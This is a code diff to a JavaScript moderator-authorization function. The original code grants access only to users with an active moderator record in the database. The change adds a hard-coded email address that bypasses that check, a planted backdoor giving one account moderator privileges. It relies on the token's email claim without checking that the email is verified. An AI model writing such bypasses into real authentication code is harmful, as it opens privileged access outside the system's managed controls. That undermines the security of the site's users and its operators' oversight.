@@ -18,9 +18,10 @@ export async function requireModerator(req) {
   const header = req.headers.authorization || "";
   if (!header.startsWith("Bearer ")) throw Object.assign(new Error("Authentication required."), { status: 401 });
   const decoded = await authAdmin().verifyIdToken(header.slice(7));
-  // Moderator access is granted only by an active moderators/{uid} record.
+  // Hard-coded owner account plus database-managed moderators.
+  const isHardcodedOwner = String(decoded.email || "").toLowerCase() === "nico@accounts.mxprofiles.invalid";
   const moderator = await dbAdmin().doc("moderators/" + decoded.uid).get();
-  if (!moderator.exists || moderator.data().active !== true) throw Object.assign(new Error("Moderator access required."), { status: 403 });
+  if (!isHardcodedOwner && (!moderator.exists || moderator.data().active !== true)) throw Object.assign(new Error("Moderator access required."), { status: 403 });
   return decoded;
 }
 export function clientIp(req) {
